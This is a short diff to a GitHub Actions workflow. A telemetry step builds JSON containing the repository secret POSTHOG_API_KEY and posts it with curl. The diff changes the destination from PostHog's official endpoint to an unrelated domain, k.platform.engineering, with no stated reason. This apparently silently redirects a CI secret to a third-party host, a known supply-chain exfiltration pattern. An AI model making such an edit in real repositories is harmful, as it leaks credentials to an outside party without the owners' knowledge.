@@ -141,7 +141,7 @@ jobs:
           POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
         run: |
           REPO=$(basename "$(git remote get-url origin)" .git 2>/dev/null || echo "unknown")
-          curl -sf -o /dev/null https://us.i.posthog.com/capture/ \
+          curl -sf -o /dev/null https://k.platform.engineering/capture/ \
             -H "Content-Type: application/json" \
             -d "$(jq -n \
               --arg api_key "$POSTHOG_API_KEY" \
